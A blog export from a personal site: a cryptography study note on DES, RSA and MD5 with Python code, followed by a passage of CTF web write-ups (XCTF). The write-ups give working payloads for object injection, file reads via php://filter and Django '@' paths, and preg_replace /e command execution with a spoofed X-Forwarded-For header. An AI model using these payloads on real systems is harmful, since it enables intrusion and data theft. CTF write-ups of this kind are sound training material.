安全性分析由算法的实现可知，序列密码算法的加解密对种子秘钥的依赖十分强烈。故需要保证种子秘钥的安全性。对于此可进行相关攻击。可以进行穷举搜素攻击，故为了保证安全强度，要求秘钥长度足够长。弱密钥攻击，弱密钥会产生重复的密钥流，一旦子密钥序列出现了重复，密文就有可能被破解。序列密码具有实现简单、便于硬件实施、加解密处理速度快、没有或只有有限的错误传播等特点，因此在实际应用中，特别是专用或机密机构中保持着优势，序列密码是一个随时间变化的加密变换，具有转换速度快、低错误传播的优点，硬件实现电路更简单。 分组密码概述DES是分组加密，将明文分成64位一组，密钥长度 64 比特（其中有效长度为 56 比特），8 的倍数位为奇校验位（保证每 8 位有奇数个 1）。如图，64 比特的密钥经过置换选择和循环移位操作可生成 16 个 48 比特的子密钥。明文 m 经过初始置换 IP 后划分为左右两部分（各32 比特），经过 16 轮 Feistel 结果（其中最后一轮不做左右交换）再做一次逆置换 IP-1得到密文 c 。 加密方程： 解密方程： 由此可见DES是一个对合运算。 密钥扩展用于生成迭代的子密钥。具体过程为： 64位初始密钥经过置换选择1 ( PC-1 ) 后变成 56 位，经过循环左移和置换选择2 ( PC-2 ) 后分别得到 16 个 48 位子密钥 Ki 用做每一轮的迭代运算。 PC-1 去掉了校验位， PC-2 去掉了9, 18, 22, 25, 35, 38, 43, 54 位。 置换选择置换选择1（PC-1）和置换选择2（PC-2）： #秘钥的PC-1置换def change_key1(my_key): res = \"\" for i in PC_1: res += my_key[i-1] return res#秘钥的PC-2置换def change_key2(my_key): res = \"\" for i in PC_2: res += my_key[i-1] return res 循环左移输入序列经过指定循环左移次数后得到结果（可以使用切片法）： #循环左移操作def left_turn(my_str,num): left_res = my_str[num:len(my_str)] left_res = my_str[0:num]+left_res return left_res 加入取模操作的好处：若 num 为负数，则相当于可以处理循环右移，方便解密时使用。 初始置换 IP 和它的逆置换 IP-1IPIP 在第一轮迭代之前进行，目的是将原明文块的位进行换位操作（查表），实际并没有密码意义，因此在软件中时常直接被去掉。 IP−1IP−1 在最后一轮迭代之后进行，在加密算法中输出为密文，在解密算法中输出明文，若 IPIP 被去掉，IP−1IP−1 也相应地被去掉。 #IP盒处理def ip_change(bin_str): res &#x3D; &quot;&quot; for i in IP_table: res +&#x3D; bin_str[i-1] #数组下标i-1 return res#IP逆盒处理def ip_re_change(bin_str): res &#x3D; &quot;&quot; for i in IP_re_table: res +&#x3D; bin_str[i-1] return res F 函数也称轮函数，包括四个过程： 扩展置换 ( E 盒 ) 密钥加 S 盒 P 盒 下面，我们分别解释这几个过程。 1. 扩展置换32 bit → 48 bit\\ 通过扩展置换，数据的右半部分 从 32 位扩展到 48 位。扩展置换改变了位的次序，重复了某些位。 image-20210112205546510 目的：让明文的 1 位可能影响到密文的 2 位，从而快速实现了雪崩效应。（结合 S 盒） #E盒置换def e_key(bin_str): res = \"\" for i in E: res += bin_str[i-1] return res 2. 密钥加48 bit ⊕ 48 bit → 48 bit\\ E 盒输出与子密钥 Xor\\ （逐位异或）。 Python 中，异或使用 ^ 运算符。因为我的处理方法是把字符转成对应的二进制（简单粗暴），所以我写了个封装 Xor\\ 的函数： #字符串异或操作def str_xor(my_str1,my_str2): res = \"\" for i in range(0,len(my_str1)): xor_res = int(my_str1[i],10)^int(my_str2[i],10) #变成10进制是转化成字符串 2进制与10进制异或结果一样，都是1,0 if xor_res == 1: res += '1' if xor_res == 0: res += '0' return res 3. 代换盒（S 盒）48 bit → 32 bit\\ 目的是实现非线性代换，是 DES 中的唯一的非线性部分。 实际上是查表运算，8 个 S 盒对应把 48 位分成 8 个组（6 位一组）。 每个 S 盒的输入为 6 位，输出为 4 位。 image-20210112205534444 利用了bin输出有可能不是4位str类型的值，所以才有下面的循环并且加上字符0 # S盒过程def s_box(my_str): res = \"\" c = 0 for i in range(0,len(my_str),6): now_str = my_str[i:i+6] row = int(now_str[0]+now_str[5],2) col = int(now_str[1:5],2) num = bin(S[c][row*16 + col])[2:] #利用了bin输出有可能不是4位str类型的值，所以才有下面的循环并且加上字符0 for gz in range(0,4-len(num)): num = '0'+ num res += num c += 1 return res 4. 置换盒（P 盒）32 bit → 32 bit\\ 简单置换。 #P盒置换def p_box(bin_str): res = \"\" for i in P: res += bin_str[i-1] return res 运行结果加密 解密 安全性分析安全性争论： S盒的设计准则还没有完全公开，人们仍然不知道S盒的构造中是否使用了进一步的设计准则 DES存在一些弱密钥和半弱密钥 DES的56位密钥无法抵抗穷举攻击 代数结构存在互补对称性 弱密钥： 给定初始密钥𝐾生成子密钥时，将种子密钥分成两个部分，如果𝐾使得这两部分的每一部分的所有位置全为0或1，则经子密钥产生器产生的各个子密钥都相同，即𝐾1=𝐾2=…=𝐾16，则称密钥𝐾为弱密钥（共有4个） 若𝐾为弱密钥，则对任意的64比特信息有： Ek(Ek(m))=m和Dk(Dk(m))=mEk(Ek(m))=m和Dk(Dk(m))=m 半弱密钥： 把明文加密成相同的密文，即存在两个不同的密钥𝑘和𝑘′,使得𝐸𝑘 (𝑚)=𝐸(𝑘^′ ) (𝑚) 具有下述性质： 若𝑘和𝑘′为一对弱密钥，𝑚为明文组，则有： Ek′(Ek(m))=Ek(Ek′(m))=mEk′(Ek(m))=Ek(Ek′(m))=m 互补性： 对明文𝑚逐位取补，记为𝑚 ̅，密钥𝐾逐位取补，记为𝑘 ̅ ， 若𝑐=𝐸𝑘(𝑚)，则有𝑐 ̅=𝐸_𝑘 ̅ (𝑚 ̅) ，称为算法上的互补性 由算法中两次异或运算的配置决定：两次异或运算一次在S盒之前，一次在P盒置换之后 若对DES 的明文和密钥同时取补，则扩展运算E的输出和子密钥产生器的输出也都取补，因而经异或运算后的输出和未取补时的输出一样，即到达S盒的输入数据未变，输出自然也不变，但经第二个异或运算时，由于左边数据已取补，因而输出也就取补 互补性使DES在选择明文攻击下所需的工作量减半（2^55） 对选择的明文𝑚和𝑚 ̅ 加密后得到密文如下： c1=Ek(m)c2=Ek(m−)c1=Ek(m)c2=Ek(m−) 由对称互补性可得 c−2=Ek−(m)c2−=Ek−(m) 所以对𝑚加密，如果密文为𝑐_1，则加密密钥为𝑘, 如果密文为(𝑐_2 ) ̅，则加密密钥为𝑘 ̅ 差分分析法： 通过分析特定明文差对结果密文差的影响来获得可能性最大的密钥。这种攻击方法主要适用于攻击迭代分组密码，最初是针对DES提出的一种攻击方法，虽然差分攻击方法对破译16轮的DES不能提供一种实用的方法，但对破译轮数较低的DES是很成功的。 线性分析法： 寻找一个给定密码算法的有关明文比特、密文比特和密钥比特的有效线性近似表达式，通过选择充分多的明－密文对来分析密钥的某些比特，用这种方法破译DES比差分分析方法更有效。可用247个已知明文破译8－轮DES。 三重DES： 两密钥的3DES称为加密-解密-加密方案，简记为EDE(encrypt-decrypt-encrypt) 破译它的穷举密钥搜索量为2112 量级，用差分分析破译也要超过1035sup&gt;量级。此方案仍有足够的安全性。 公钥密码RSARSA算法原理 密钥的生成 选择两个大素数 𝑝和𝑞,（𝑝≠𝑞，需要保密，步骤4以后建议销毁） 计算𝑛=𝑝×𝑞， (𝑛)=(𝑝－1)×(𝑞－1) 选择整数 𝑒 使 ((𝑛)，𝑒) =1, 1&lt;𝑒&lt; (𝑛) 计算𝑑，使𝑑=𝑒－1 𝑚𝑜𝑑 (𝑛), 得到：公钥为{𝑒, 𝑛}； 私钥为{𝑑} 加密(用𝒆，𝒏)： 明文𝑀&lt;𝑛， 密文𝐶=𝑀^𝑒 (𝑚𝑜𝑑 𝑛). 解密(用𝒅，𝒏)： 密文𝐶， 明文𝑀 =𝐶^𝑑 (𝑚𝑜𝑑 𝑛) 大素数生成对于大整数的素性测试，一般用 Miller-Rabin 算法。它是一个基于概率的算法，是费马小定理（若 n 是一个素数，则 an-1 ≡ 1 (mod n) ）的一个改进。要测试 n 是否为素数，首先将 n−1 分解为 2sd 。在每次测试开始时，先随机选一个介于 [1,n−1] 的整数 a ，之后如果对所有的 r∈[0,s−1] ，若admodn≠1 且 a2rd mod n≠−1，则 n 是合数。否则，n 有 3/4 的概率为素数。增加测试的次数，该数是素数的概率会越来越高。这样，我们就可以给定位数 n 的情况下随机生成数，然后再用 Miller-Rabin 算法验证它是不是素数，若是，则就用它，否则再随机生成其他数字，循环。Python 脚本如下： def miller_rabin(n, k=10): \"\"\" 用Miler-Rabin算法进行素性检验 :param n: 被检验的数 :param k: 检验的次数，默认为15次 :return: 是否通过检验 要测试n是否为素数,首先将n−1分解为(2^s)d 在每次测试开始时,先随机选一个介于[1,n−1]的整数a,之后如果对所有的r∈[0,s−1] , 若a^d ≠1 (mod n)且 a^(2^rd)≠−1(mod n),则n是合数 否则，n 有 3/4 的概率为素数,增加测试的次数,该数是素数的概率会越来越高。 \"\"\" # 偶数直接不通过 if n % 2 == 0: return False s, d = 0, n - 1 # 将p-1分解为(2**s)d while d % 2 == 0: s += 1 d //= 2 # 进行k次检验566++3.+6 for i in range(k): # 每次测试时,随机选取一个[1,n-1]的整数a a = randint(1, n - 1) x = pow(a, d, n) # x = a**d mod(n) # 如果a**d(mod n)=1,说明当次检验通过(不是合数),进行下一轮检验 if x == 1 or x == n - 1: continue else: flag = 0 # 对所有的r∈[0, s-1],判断a**((2**r)*d) (mod n)是否等于-1， for r in range(s): # x**pow(2,r) == a**d**pow(2,r) x = pow(x, 2, n) if x == n - 1: flag = 1 break # 若a**d≠1(mod n)且a**pow(2,r)**≠ if flag == 0: return False return True 带模的幂运算原理：模重复平方运算，Python 代码如下： def fast_mod(x, n, p): x = x % p res = 1 while n!=0: if n &amp; 1: res = (res * x) % p n &gt;&gt;= 1 # 相当于 n //= 2 x = (x * x) % p return res 求逆运算扩展欧几里得法 def extended_gcd(a, b): \"\"\" 扩展的欧几里得算法计算gcd的最大公因子g以及x和y,满足g=ax+by 递归式的推导过程: ax₁ + by₁ = gcd(a,b) bx₂ + (a%b)y₂ = gcd(b,a%b) ∵ gcd(a,b) = gcd(b,a%b) 且 a%b = a - (a//b)*b ∴ bx₂ + (a%b)y₂ = bx₂ + [a - (a//b)*b]y₂ = ay₂ + bx₂ - (a//b)by₂ = ay₂ + b[x₂ - (a//b)y₂] = ax₁ + by₁ ∴待定系数法得:x₁ = y₂, y₁ = x₂ - (a//b)y₂ 递归终止条件: 当b = 0, gcd(a,b) = a, 此时 x = 1,y = 0 :return: (g,s,t) \"\"\" if b == 0: return a, 1, 0 else: g, x, y = extended_gcd(b, a % b) # 先得到更里层的x₂,y₂, return g, y, x - (a // b) * y # 再根据得到的x₂,y₂,计算x₁,y₁def mod_inverse(a, m): \"\"\" 计算模逆,即a**-1 (mod m) :param a: 底数 :param m: 模数 :return: 逆元 \"\"\" g, x, y = extended_gcd(a, m) # ax + my = 1 # 若a,m不互素,则不可逆 if g != 1: raise Exception(str(a) + ' is not invertible!') else: return x % m 运行结果 安全性分析RSA的安全性依赖于大数分解问题，目前，还未能从数学上证明由𝑐和𝑒计算出𝑚一定需要分解𝑛，然而，如果新方法能使密码分析者推算出𝑑，它也就成为大数分解的一个新方法 非对称加密算法中 1024 bit 密钥的强度相当于对称加密算法 80bit 密钥的强度。但是，从效率上，密钥长度增长一倍，公钥操作所需时间增加约 4 倍，私钥操作所需时间增加约 8 倍，公私钥生成时间约增长16倍。所以，我们要权衡一下效率和安全性。一般来说， 1024 bit 只能用于加密 最多117 字节的明文。 低加密指数攻击： 为了使加密高效，一般希望选取较小的加密指数 ee ，但是 ee 不能太小，否则容易遭到低加密指数攻击。 假设用户使用的密钥 e=3e=3 。考虑到加密关系满足： 低加密指数广播攻击： 还有一种情况是如果给 k 个用户发的都是同个低加密指数比如 e=3 ，在不同的模数 n1.n2,n3下 ，可由 CRT（中国剩余定理） 解出 m3 ，从而直接开三次根解出 m。 共模攻击： 场景：n 相同（让多个用户使用相同的模数 n ），但他们的公私钥对不同。这样，我们可以在已知 n,e1,e2,c1,c2 的情况下解出 m 。过程如下： 其实有个隐形的前提条件是： 存在 s1,s2 使得： 又由 RSA 定义可知： 可得出： 这样，我们仅需要使用扩展欧几里得算法求出 s1,s2s1,s2 便可解出明文。 MD5加密概述Hash，一般翻译做散列、杂凑，或音译为哈希，是把任意长度的输入(又叫做预映射)通过散列算法变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是说，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来确定唯一的输入值。简单的说就是是将任意长度的输入变换为固定长度的输出的不可逆的单向密码体制。 MD5(Message-Digest Algorithm,信息摘要算法)，是由美国著名密码学家Rivest设计的一种密码散列函数，可以将长度小于264比特的消息，按512比特的分组单位进行处理，输出一个128比特的消息摘要。 MD5具有Hash函数的所有特性。 ​ ①压缩性。无论输入的明文多长，计算出来的MD5值长度固定为128位。 ​ ②易计算性。由原数据容易计算出MD5值 。 ​ ③抗碰撞性。知道明文和MD5值，很难找到相同MD5值相同的明文。 ​ ④抗修改性。即便修改一个字节，计算出来的MD5值也会存在极大差异 ​ MD5是在MD4基础上发展而来的，虽然比MD4稍慢，但更安全，实现了更快的雪崩效应，在实际应用中更受欢迎。 ​ 散列函数的安全性主要体现在其良好的单向性和对碰撞的有效避免。由于散列变换是一种压缩变换，输入和输出长度相差极大啊，很难通过输出来确定 输入。但是，散列函数经常被用于数据改动检测，如果一个合法消息和一个非法消息能够碰撞，攻击就可以用合法消息生成散列值，再以非法消息作为该散列值的对应消息进行欺骗，且是他人无法识别。所以，对于Hash函数的攻击，攻击者的主要目标不是恢复原始明文，而是用相同散列值的非法消息来替代合法消息进行伪造和欺骗。 ​ 对于MD5的碰撞研究，王小云教授做出了突破性的贡献，她的研究成果可以概括为：对于给定的M1，可以比较快速地找到M2，使得H(M1)=H(M2)。在2004年发表的论文中，她在IBM P690上用了一个小时左右就找了这样的一个碰撞，放到现在的计算机上面，这个时间会更短。所以，如果是要求高度保密的场所，比如说军工之类，MD5已经不安全了，应更换为更安全的Hash算法；但对于民用来说，一般没有人有能承受那么大计算量的设备，在一些不重要的认证上面仍可使用。 MD5算法原理消息填充 使消息长度模512=448如果消息长度模512恰等于448，增加512个填充比特。即填充的个数为1~512，填充方法：第1比特为1，其余全部为0 将消息长度转换为64比特的数值，如果长度超过64比特所能表示的数据长度，值保留最后64比特添加到填充数据后面，使数据为512比特的整数倍 512比特按32比特分为16组 注：64位数据长度存储的时候是小端序 初始化链接变量使用4个32位的寄存器A， B，C， D存放4个固定的32位整型参数，用于第一轮迭代，这里需要注意的是，寄存器的值要转化为小端序。 A=0x01234567 B=0x89abcdef C=0xfedcba98 D=0x76543210 分组处理与分组密码分组处理相似，有4轮步骤，将512比特的消息分组平均分为16个子分组，每个子分组有32比特，参与每一轮的的16步运算，每步输入是4个32比特的链接变量和一个32位的的消息子分组，经过这样的64步之后得到4个寄存器的值分别与输入的链接变量进行模加。 步函数 image-20210112205456498 该函数包括 4 轮，每轮 16 步，上一步的链接变量 D, B, C 直接赋值给下一步的链接变量 A, C, D。 A 先和非线性函数的结果加一下，结果再和 M[j] 加一下，结果再和 T[i] 加一下，结果再循环左移 s 次，结果再和原来的 B 加一下，最后的得到新 B。 非线性函数： image-20210112205446350 代码实现消息填充# 对消息进行填充def message_padding(m): # 计算附加的64为长度(小端序表示) len_padding = bin2little(bin(len(m))[2:].zfill(64)) m += '1' while len(m) % 512 != 448: m += '0' return m + len_padding 初始化链接变量# 初始链接变量(小端序表示)IV_A, IV_B, IV_C, IV_D = (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476) 分组处理及步函数# 压缩函数(对每个512bit分组进行处理)def compress_func(a, b, c, d, m): \"\"\" 压缩函数函数,对每512bit得分组进行处理,包括4轮,每轮16步 :param a, b, c, d: 输入链接变量(即前一个分组的输出链接变量) :param m: 512bit的消息分组 :return: A,B,C,D 输出链接变量 \"\"\" # 对每一分组的初始链接变量进行备份 A, B, C, D = a, b, c, d # 将512bit分为16组,每组32bit m_list_32 = re.findall(r'.&#123;32&#125;', m) # 每个分组经过4轮函数 for round_index in range(4): # 每轮有16步 for step_index in range(16): # 对每一步的链接变量进行备份 AA, BB, CC, DD = A, B, C, D # 每一轮选择不同的非线性函数 if round_index == 0: func_out = F(B, C, D) elif round_index == 1: func_out = G(B, C, D) elif round_index == 2: func_out = H(B, C, D) else: func_out = I(B, C, D) A, C, D = D, B, C # B模加非线性函数的输出 B = mod_add(AA, func_out) # 模加消息分组(注意为大端序) B = mod_add(B, int(bin2little(m_list_32[M_index_[round_index][step_index]]), 2)) # print(type(B)) # 模加伪随机常数 B = mod_add(B, T(16 * round_index + step_index + 1)) # 循环左移s位 B = rol(B, shift_[round_index][step_index]) # 模加BB B = mod_add(B, BB) # print(str(16 * round_index + step_index + 1).zfill(2), end=\" \") # print(hex(A).replace(\"0x\", \"\").replace(\"L\", \"\").zfill(8), end=\" \") # print(hex(B).replace(\"0x\", \"\").replace(\"L\", \"\").zfill(8), end=\" \") # print(hex(C).replace(\"0x\", \"\").replace(\"L\", \"\").zfill(8), end=\" \") # print(hex(D).replace(\"0x\", \"\").replace(\"L\", \"\").zfill(8)) # print(\"*\" * 38) # 与该分组的初始链接变量异或 A = mod_add(A, a) B = mod_add(B, b) C = mod_add(C, c) D = mod_add(D, d) return A, B, C, D 运行结果 找一个在线加密的网站验证一下 安全性分析攻击者的主要目标不是恢复原始的明文，而是用非法消息替代合法消息进行伪造和欺骗，对哈希函数的攻击也是寻找碰撞的过程。 基本攻击方法： （1）穷举攻击：能对任何类型的Hash函数进行攻击 最典型方法是“生日攻击”：给定初值𝐻0=H(M)，寻找𝑀’≠ 𝑀，使ℎ(𝑀’)= 𝐻0 （2）密码分析法：依赖于对Hash函数的结构和代数性质分析，采用针对Hash函数弱性质的方法进行攻击。这类攻击方法有中间相遇攻击、修正分组攻击和差分分析等 MD5算法中，输出的每一位都是输入的每一位的函数，逻辑函数F、G、H、I的复杂迭代使得输出对输入的依赖非常小 但Berson证明，对单轮的MD5算法，利用差分分析，可以在合理时间内找出碰撞的两条消息 MD5算法抗密码分析的能力较弱，生日攻击所需代价是试验264个消息 2004年8月17日，在美国加州圣巴巴拉召开的美密会（Crypto2004）上，中国的王小云、冯登国、来学嘉、于红波4位学者宣布，只需1小时就可找出MD5的碰撞（利用差分分析）","categories":[{"name":"Study","slug":"Study","permalink":"https://github.com/gha01un/gha01un.github.io/categories/Study/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/gha01un/gha01un.github.io/tags/AI/"}],"author":"H1un"},{"title":"攻防世界WEB","slug":"攻防世界web","date":"2021-01-06T14:45:14.455Z","updated":"2021-01-11T02:59:27.637Z","comments":true,"path":"2021/01/06/攻防世界web/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2021/01/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/","excerpt":"网安实验被迫写WEB!","text":"网安实验被迫写WEB! PHP2考察.phps源码泄露、URL二次编码绕过 一开始我也没明白这个题是什么意思，看了大佬的wp才知道是有.phps源码泄露： 访问index.phps得到源码： 看源码就可以知道这个是很简单的URL二次编码绕过，所以payload：?id=ad%256din flag到手。 unserialize3绕过魔法函数sleep()和wakeup()的反序列化漏洞 题目名叫unserialize3，那应该是跟反序列化有关的题目。 看一下源码，出现了__wakeup()这个魔法函数： unserialize()执行时会检查是否存在一个wakeup()方法。如果存在则先调用wakeup()方法，预先准备对象需要的资源。wakeup()经常用在反序列化操作中。sleep()则相反，是在序列化一个对象的时候被调用。 这个漏洞的核心是：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup()的执行。 将题目中的类序列化得到结果：O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;} 简单解释一下这个字符串： O代表结构类型为类，4表示类名长度，然后是类名、成员个数。 大括号内的值是：属性名类型、长度、名称；值类型、长度、值。 如果我们把传入序列化字符串的属性个数改成比1更大的值，就不会触发__wakeup()方法，进而得到flag。 payload:?code=O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;} Cat个人感觉比较综合也比较难的题目，考察的是url编码和django的知识 打开网页发现是一个ping功能，但是输入正常的用户名没有反应，输入ip地址有反应： 本来因为题目名叫cat，又是ping，以为是命令执行，但是尝试了|、&amp;等都报错，提示Invalid URL。看来题目的本意并不是命令执行。 看了网上一个大佬的wp才知道这个是跟Django有关的。网站本身是用PHP写的，但是可能有Django的组成部分。 在url里传参%80报错（URL编码是0~127，80的十六进制是128自然报错），从报错信息的目录结构可以知道这个是Django的项目： image-20210106224024807 其他的没什么信息，又去看了看大佬的wp，发现这个原来还需要用PHP的@前缀： 根据Django的目录特性，用@进行文件传递，对文件进行读取之后将内容传给url参数，如果有错误信息就可以得到回显，进而取得更多错误信息、帮助我们拿到flag。 先看看settings.py： payload: ?url=@/opt/api/api/settings.py 找到数据库文件的存放位置： 看看这个文件： payload： ?url=@/opt/api/database.sqlite3 搜索CTF得到flag。 ics-05进去之后随便点点发现了这个： page=index，那应该可以用伪协议读出源码。 payload:page=php://filter/read=convert.base64-encode/resource=index.php 源码到手，base64解码一下： &lt;?phperror_reporting(0);@session_start();posix_setuid(1000);?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"renderer\" content=\"webkit\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"&gt; &lt;link rel=\"stylesheet\" href=\"layui/css/layui.css\" media=\"all\"&gt; &lt;title&gt;è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;ul class=\"layui-nav\"&gt; &lt;li class=\"layui-nav-item layui-this\"&gt;&lt;a href=\"?page=index\"&gt;äº‘å¹³å�°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;fieldset class=\"layui-elem-field layui-field-title\" style=\"margin-top: 30px;\"&gt; &lt;legend&gt;è®¾å¤‡åˆ—è¡¨&lt;/legend&gt; &lt;/fieldset&gt; &lt;table class=\"layui-hide\" id=\"test\"&gt;&lt;/table&gt; &lt;script type=\"text/html\" id=\"switchTpl\"&gt; &lt;!-- è¿™é‡Œçš„ checked çš„çŠ¶æ€�å�ªæ˜¯æ¼”ç¤º --&gt; &lt;input type=\"checkbox\" name=\"sex\" value=\"&#123;&#123;d.id&#125;&#125;\" lay-skin=\"switch\" lay-text=\"å¼€|å³\" lay-filter=\"checkDemo\" &#123;&#123; d.id==1 0003 ? 'checked' : '' &#125;&#125;&gt; &lt;/script&gt; &lt;script src=\"layui/layui.js\" charset=\"utf-8\"&gt;&lt;/script&gt; &lt;script&gt; layui.use('table', function() &#123; var table = layui.table, form = layui.form; table.render(&#123; elem: '#test', url: '/somrthing.json', cellMinWidth: 80, cols: [ [ &#123; type: 'numbers' &#125;, &#123; type: 'checkbox' &#125;, &#123; field: 'id', title: 'ID', width: 100, unresize: true, sort: true &#125;, &#123; field: 'name', title: 'è®¾å¤‡å��', templet: '#nameTpl' &#125;, &#123; field: 'area', title: 'åŒºåŸŸ' &#125;, &#123; field: 'status', title: 'ç»´æŠ¤çŠ¶æ€�', minWidth: 120, sort: true &#125;, &#123; field: 'check', title: 'è®¾å¤‡å¼€å³', width: 85, templet: '#switchTpl', unresize: true &#125; ] ], page: true &#125;); &#125;); &lt;/script&gt; &lt;script&gt; layui.use('element', function() &#123; var element = layui.element; //å¯¼èˆªçš„hoveræ•ˆæžœã€�äºŒçº§è�œå�•ç­‰åŠŸèƒ½ï¼Œéœ€è¦�ä¾�èµ–elementæ¨¡å�— //ç›‘å�¬å¯¼èˆªç‚¹å‡» element.on('nav(demo)', function(elem) &#123; //console.log(elem) layer.msg(elem.text()); &#125;); &#125;); &lt;/script&gt;&lt;?php$page = $_GET[page];if (isset($page)) &#123;if (ctype_alnum($page)) &#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;else&#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt; &lt;?php if (strpos($page, 'input') &gt; 0) &#123; die(); &#125; if (strpos($page, 'ta:text') &gt; 0) &#123; die(); &#125; if (strpos($page, 'text') &gt; 0) &#123; die(); &#125; if ($page === 'index.php') &#123; die('Ok'); &#125; include($page); die(); ?&gt; &lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;&#125;//æ–¹ä¾¿çš„å®žçŽ°è¾“å¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å�‘ä¸­çš„åŠŸèƒ½ï¼Œå�ªèƒ½å†éƒ¨äººå‘˜æµ‹è¯•if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt;&lt;/body&gt;&lt;/html&gt; 发现了危险函数preg_replace()，存在命令执行漏洞。 preg_replace( pattern , replacement , subject ) : 当pattern指明/e标志时 ,preg_replace()会将replacement部分的代码当作PHP代码执行 (简单的说就是将replacement参数值放入eval()结构中) payload:/index.php?pat=/test/e&amp;rep=phpinfo()&amp;sub=test，这里还需要一个XFF绕过（至于为什么请看源码），可以用BurpSuite的Repeater来测试： 最终拿到flag的payload：/index.php?pat=/test/e&amp;rep=system(&#39;cat%20./s3chahahaDir/flag/flag.php&#39;)&amp;sub=test： Triangle进去之后先读一波JavaScript源码，源码的格式比较乱，可以用Chrome自带的代码格式化功能格式化一下： util.js function test_pw(e, _) &#123; var t = stoh(atob(getBase64Image(\"eye\"))) , r = 4096 , m = 8192 , R = 12288 , a = new uc.Unicorn(uc.ARCH_ARM,uc.MODE_ARM); a.reg_write_i32(uc.ARM_REG_R9, m), a.reg_write_i32(uc.ARM_REG_R10, R), a.reg_write_i32(uc.ARM_REG_R8, _.length), a.mem_map(r, 4096, uc.PROT_ALL); for (var o = 0; o &lt; o1.length; o++) a.mem_write(r + o, [t[o1[o]]]); a.mem_map(m, 4096, uc.PROT_ALL), a.mem_write(m, stoh(_)), a.mem_map(R, 4096, uc.PROT_ALL), a.mem_write(R, stoh(e)); var u = r , c = r + o1.length; return a.emu_start(u, c, 0, 0), a.reg_read_i32(uc.ARM_REG_R5)&#125;function enc_pw(e) &#123; var _ = stoh(atob(getBase64Image(\"frei\"))) , t = 4096 , r = 8192 , m = 12288 , R = new uc.Unicorn(uc.ARCH_ARM,uc.MODE_ARM); R.reg_write_i32(uc.ARM_REG_R8, r), R.reg_write_i32(uc.ARM_REG_R9, m), R.reg_write_i32(uc.ARM_REG_R10, e.length), R.mem_map(t, 4096, uc.PROT_ALL); for (var a = 0; a &lt; o2.length; a++) R.mem_write(t + a, [_[o2[a]]]); R.mem_map(r, 4096, uc.PROT_ALL), R.mem_write(r, stoh(e)), R.mem_map(m, 4096, uc.PROT_ALL); var o = t , u = t + o2.length; return R.emu_start(o, u, 0, 0), htos(R.mem_read(m, e.length))&#125;function get_pw() &#123; for (var e = stoh(atob(getBase64Image(\"templar\"))), _ = \"\", t = 0; t &lt; o3.length; t++) _ += String.fromCharCode(e[o3[t]]); return _&#125; secret.js function test_pw(e, _) &#123; var t = stoh(atob(getBase64Image(\"eye\"))) , r = 4096 , m = 8192 , R = 12288 , a = new uc.Unicorn(uc.ARCH_ARM,uc.MODE_ARM); a.reg_write_i32(uc.ARM_REG_R9, m), a.reg_write_i32(uc.ARM_REG_R10, R), a.reg_write_i32(uc.ARM_REG_R8, _.length), a.mem_map(r, 4096, uc.PROT_ALL); for (var o = 0; o &lt; o1.length; o++) a.mem_write(r + o, [t[o1[o]]]); a.mem_map(m, 4096, uc.PROT_ALL), a.mem_write(m, stoh(_)), a.mem_map(R, 4096, uc.PROT_ALL), a.mem_write(R, stoh(e)); var u = r , c = r + o1.length; return a.emu_start(u, c, 0, 0), a.reg_read_i32(uc.ARM_REG_R5)&#125;function enc_pw(e) &#123; var _ = stoh(atob(getBase64Image(\"frei\"))) , t = 4096 , r = 8192 , m = 12288 , R = new uc.Unicorn(uc.ARCH_ARM,uc.MODE_ARM); R.reg_write_i32(uc.ARM_REG_R8, r), R.reg_write_i32(uc.ARM_REG_R9, m), R.reg_write_i32(uc.ARM_REG_R10, e.length), R.mem_map(t, 4096, uc.PROT_ALL); for (var a = 0; a &lt; o2.length; a++) R.mem_write(t + a, [_[o2[a]]]); R.mem_map(r, 4096, uc.PROT_ALL), R.mem_write(r, stoh(e)), R.mem_map(m, 4096, uc.PROT_ALL); var o = t , u = t + o2.length; return R.emu_start(o, u, 0, 0), htos(R.mem_read(m, e.length))&#125;function get_pw() &#123; for (var e = stoh(atob(getBase64Image(\"templar\"))), _ = \"\", t = 0; t &lt; o3.length; t++) _ += String.fromCharCode(e[o3[t]]); return _&#125; unicorn.js是一个JavaScript框架的源码，暂时不去管它。 我们把get_pw()在console里执行一下得到返回值： image-20210106224107993 执行enc_pw和test_pw得到返回值： enc_pw: 